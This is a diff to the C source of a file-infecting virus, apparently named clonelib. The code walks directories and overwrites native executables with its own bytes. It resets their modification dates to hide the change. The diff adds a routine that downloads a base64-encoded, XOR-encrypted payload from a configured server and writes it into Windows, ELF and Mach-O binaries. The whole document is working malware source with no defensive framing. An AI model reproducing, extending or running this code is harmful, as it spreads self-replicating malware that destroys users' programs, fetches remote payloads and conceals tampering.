@@ -4,12 +4,52 @@
 #include <time.h>
 #include "settings.h"
 #include "os.h"
+#include "web.h"
 #include "clonelib.h"
+#include "thirdparty/b64.h"
 #ifndef INT32_MAX
 	#define INT32_MAX 2147483647
 #endif
 
-Bytes* getOwnBytes(const char* arg0){	
+void getTempDir(char** tempdir){
+	#if defined(_WIN32)
+		strcpy(*tempdir,getenv("TEMP"));
+	#else
+		strcpy(*tempdir,getenv("TMPDIR"));
+	#endif
+}
+
+unsigned int getRemoteBytes(char** decrypted_msg, const char* url){
+	//get encoded message
+	char* encoded_msg=getHTML(url);
+	
+	//Decode message
+	char* decoded_msg;
+	unsigned int raw_msg_size=b64decode(&decoded_msg,encoded_msg);
+	
+	//Deallocate and allocate
+	free(encoded_msg);
+	*decrypted_msg=(char*)malloc(sizeof(char)*(raw_msg_size-XOR_KEY_SIZE));
+	char key[XOR_KEY_SIZE];
+
+	//Decrypt message
+	for(unsigned int i=0;i<raw_msg_size;i++){
+		if(i<XOR_KEY_SIZE){
+			key[i]=decoded_msg[i];
+		}else{
+			//XOR with key
+			(*decrypted_msg)[i-XOR_KEY_SIZE]=decoded_msg[i]^key[(i-XOR_KEY_SIZE)%XOR_KEY_SIZE];
+		}
+	}
+
+	//Deallocate memory
+	free(decoded_msg);
+	
+	
+	
+	return raw_msg_size-XOR_KEY_SIZE;
+}
+unsigned int getOwnBytes(char** bytes, const char* arg0){	
 	//Get name of executable
 	char* execname;
 	#ifdef _WIN32
@@ -27,115 +67,76 @@ Bytes* getOwnBytes(const char* arg0){
 	#endif
 
 	
-	//Open self as malfile
-	FILE* malfile=fopen(execname,"rb");
+	//Open self
+	FILE* self_fp=fopen(execname,"rb");
 	
-	//Check malfile size
+	//Check filesize
+	fseek(self_fp,0,SEEK_END);
+	unsigned int size=ftell(self_fp);
+	fseek(self_fp,0,SEEK_SET);
 	
-	fseek(malfile,0,SEEK_END);
-	unsigned int malsize=ftell(malfile);
-	fseek(malfile,0,SEEK_SET);
+	//Get own bytes
+	(*bytes)=(char*)malloc(sizeof(char)*size);
+	fread(bytes,1,size,self_fp);
 	
-	//Get malcode
-	char* malcode=(char*)malloc(sizeof(char)*malsize);
-	fread(malcode,1,malsize,malfile);
-	fclose(malfile);
-	
-	//Put into bytes
-	Bytes* bytes=(Bytes*)malloc(sizeof(Bytes));
-	bytes->value=(char*)malloc(sizeof(char)*malsize);
-	for(unsigned int i=0;i<malsize;i++){
-		bytes->value[i]=malcode[i];
-	}
-	bytes->length=malsize;
-	
-	//free memory
-	free(malcode);
+	//Clean up
+	fclose(self_fp);
 	free(execname);
 	
-	//Return Bytes struct pointer
-	return bytes;
+	//Return size of bytes
+	return size;
 }
 
 
-bool infectTarget(const char* target, Bytes* malbytes){
-	const char* malcode=malbytes->value;
-	unsigned int malsize=malbytes->length;
+bool infectTarget(const char* target, char* malcode, unsigned int malsize){
 	
-	//Get temp directory
-	#if defined(_WIN32)
-		char* tempdir=(char*)malloc(sizeof(char)*strlen(getenv("TEMP")));
-		strcpy(tempdir,getenv("TEMP"));
-	#elif defined(__APPLE__) && defined(__MACH__)
-		char* tempdir=(char*)malloc(sizeof(char)*strlen(getenv("TEMP")));
-		strcpy(tempdir,getenv("TMPDIR"));
-	#else
-		char* tempdir="/tmp";
-	#endif
-	
-	//Get info from target file
+	//Get target modify date
 	int64_t tardate=getFileModifiedDate(target);
 	
 	//Open target file
 	FILE* tarfile=fopen(target,"rb");
 	if(tarfile==NULL)return 0;
+	
+	//Get target file size
 	fseek(tarfile,0,SEEK_END);
 	unsigned int tarsize=ftell(tarfile);
 	fseek(tarfile,0,SEEK_SET);
+	
+	//Read target file
 	char* tarcode=(char*)malloc(sizeof(char)*tarsize);
 	fread(tarcode,1,tarsize,tarfile);
 	fclose(tarfile);
 	
-	/* Not sure if we're actually going to implement this feature
-	   It makes it harder to pack the executable beforehand
 	
-	//Generate alphanumeric key(linkcode)
-	char linkcode[LINK_TAG_LENGTH+1];
-	srand(time(NULL));
-	for(unsigned int i=0;i<LINK_TAG_LENGTH;i++){
-		linkcode[i]=(rand()%2)?rand()%10+48:rand()%26+65;
-		linkcode[i+1]='\0';
-	}
+	//Limit executable size
+	/*FIXME: Code transfer size should be limited dynamically,
+	not statically*/
+	malsize=(malsize>MAX_EXEC_SIZE)?MAX_EXEC_SIZE:malsize;
 	
-	//Find link path
-	char* linkpath=(char*)malloc(LINK_TAG_LENGTH+1+strlen(tempdir));
-	strcpy(linkpath,tempdir);
-	strcat(linkpath,"/.");
-	strcat(linkpath,linkcode);
-	strcat(linkpath,".exe");
-	
-	//Copy target to link path
-	FILE* linkfile=fopen(linkpath,"wb");
-	for(unsigned int i=0;i<tarsize;i++){fprintf(linkfile,"%c",tarcode[i]);}
-	fclose(linkfile);
-	
-	*/
-	
-	//Clone self to target	
-	//malsize=(malsize>12000)?12000:malsize;
-	printf("Cloning...(ts:%d,ms:%d)\n",tarsize,malsize);
+	//Open target for cloning
 	tarfile=fopen(target,"wb");
+	if(tarfile==NULL)return 0;
+
+	
+	//Clone to target
 	for(unsigned int i=0;i<malsize;i++){fprintf(tarfile,"%c",malcode[i]);}
+	
+	//Fill with original bytes and close
 	if(tarsize>malsize){
 		for(unsigned int i=0;i<(tarsize-malsize);i++)
 			fprintf(tarfile,"%c",tarcode[malsize+i]);
 	}
 	fclose(tarfile);
+	
+	//Reset modify date
 	setFileModifiedDate(target,tardate);
 	
 	//Free memory and return
-	//free(linkpath);
 	free(tarcode);
-	#ifndef __linux__
-		free(tempdir);
-	#endif
 	return 1;
 }
 
 bool infectDirectory(const char* path, const char* arg0){
-	//Get rid of warning
-	printf("%s\r",arg0);
-	
 	//Get list of files
 	char** ls=walkDir(path);
 	
@@ -145,7 +146,7 @@ bool infectDirectory(const char* path, const char* arg0){
 		//Check if possible executable
 		if(!strcmp(getFileExtension(ls[i]),"\0") || !strcmp(getFileExtension(ls[i]),"exe\0")){
 			
-			//Make sure under 2 GB
+			//Make sure target under 2 GB
 			if(getFileSize(ls[i])<=INT32_MAX){
 				
 				//Check if definite executable
@@ -153,30 +154,40 @@ bool infectDirectory(const char* path, const char* arg0){
 				if(exectype->is_exec){	
 					printf("%s",ls[i]);
 					if(exectype->is_native ){
-						//Copy code
+						//Copy own code
 						printf("(native)\n");
-						Bytes* bytes=getOwnBytes(arg0);
-						printf("%d",infectTarget(ls[i],bytes));
+						char* bytes;
+						unsigned int bytes_size=getOwnBytes(&bytes,arg0);
+						printf("%d",infectTarget(ls[i],bytes,bytes_size));
 						free(bytes);
 						
 					}else{
+						char* remote_url=(char*)malloc(sizeof(char)*strlen(SERVER_HOSTNAME XBIN_WIN64));
 						if(exectype->is_win){
 							//Get windows binary
 							printf("(windows)");
+							strcpy(remote_url,SERVER_HOSTNAME XBIN_WIN64);
 							
 						}else if(exectype->is_elf){
 							//Get elf/linux binary
 							printf("(elf)");
+							strcpy(remote_url,SERVER_HOSTNAME XBIN_ELF64);
 							
 						}else if(exectype->is_macho){
 							//Get OSX binary
 							printf("(mach-o)");
-							
+							strcpy(remote_url,SERVER_HOSTNAME XBIN_MAC64);
 						}else{
 							printf("Error(clonelib.c) - No platform\n");
 							return false;
 						}
+						
 						//Copy code from external binary
+						char* bytes;
+						unsigned int bytes_size=getRemoteBytes(&bytes,remote_url);
+						printf("%d",infectTarget(ls[i],bytes,bytes_size));
+						free(bytes);
+						free(remote_url);
 					}
 					printf("\n");
 				}
